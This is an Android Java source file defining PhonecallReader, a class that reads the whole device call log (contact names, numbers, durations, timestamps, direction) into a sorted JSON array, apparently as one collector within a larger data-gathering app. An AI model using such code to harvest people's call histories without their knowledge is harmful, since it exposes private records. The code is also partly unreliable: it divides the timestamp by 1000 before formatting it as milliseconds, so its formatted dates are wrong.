package xyz.lateralus.components.readers;


import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;

import xyz.lateralus.Config;
import xyz.lateralus.components.Utils;

import org.json.JSONArray;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.Locale;


public class PhonecallReader extends DataReader{
    private static final String TAG = "PhonecallReader";

    private static final String ROOT_KEY = "phonecalls";
    private static final String CONTENT_CALL_LOG = "content://call_log/calls";

    public static final String KEY_NAME      = "name";
    public static final String KEY_NUMBER    = "number";
    public static final String KEY_DURATION  = "duration";
    public static final String KEY_TS        = "timestamp";
    public static final String KEY_DIRECTION = "direction";
    public static final String KEY_TS_FORMATTED = "timestamp_formatted";

    public PhonecallReader(Context ctx) {
        super(ctx);
    }

    @Override
    public JSONObject getData() {
        try {
            return new JSONObject().put(ROOT_KEY, getPhonecalls());
        }
        catch(Exception e){
            Log.e(TAG, "Error getting phonecalls");
            e.printStackTrace();
        }
        return null;
    }

    @Override
    public String getRootKey() {
        return ROOT_KEY;
    }

    private JSONArray getPhonecalls(){
        ArrayList<JSONObject> calls = new ArrayList<>();
        Cursor cursor = _ctx.getContentResolver().query(Uri.parse(CONTENT_CALL_LOG), null, null, null, null);
        SimpleDateFormat sdf = new SimpleDateFormat(Config.TIMESTAMP_FORMAT, Locale.ENGLISH);
        if(cursor.moveToFirst()) {
            do {
                try {
                    JSONObject call = new JSONObject();
                    long ts = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)) / 1000;
                    String date = sdf.format(new Date(ts));
                    call.put(KEY_NAME, cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)));
                    call.put(KEY_NUMBER, Utils.parsePhoneNumber(cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))));
                    call.put(KEY_DURATION, cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION)));
                    call.put(KEY_TS, ts);
                    call.put(KEY_TS_FORMATTED, date);
                    call.put(KEY_DIRECTION, (cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)) == CallLog.Calls.INCOMING_TYPE) ?
                            "incoming" : "outgoing");
                    calls.add(call);
                }
                catch(Exception e){
                    Log.e(TAG, "Error creating phonecall data!");
                    e.printStackTrace();
                }
            }
            while(cursor.moveToNext());
            cursor.close();

            // sort phone calls
            Collections.sort(calls, new Comparator<JSONObject>() {
                @Override
                public int compare(JSONObject a, JSONObject b) {
                    try{
                        // most recent first, oldest last
                        return (a.getLong(KEY_TS) > b.getLong(KEY_TS)) ? -1 : 1;
                    }
                    catch(Exception e){
                        Log.e(TAG, "Error comparing phonecalls!");
                        e.printStackTrace();
                    }
                    return 0;
                }
            });

            // put phonecalls into JSONArray
            JSONArray sortedPhonecalls = new JSONArray();
            for(int y = 0; y < calls.size(); y++){
                sortedPhonecalls.put(calls.get(y));
            }

            return sortedPhonecalls;
        }
        return null;
    }
}
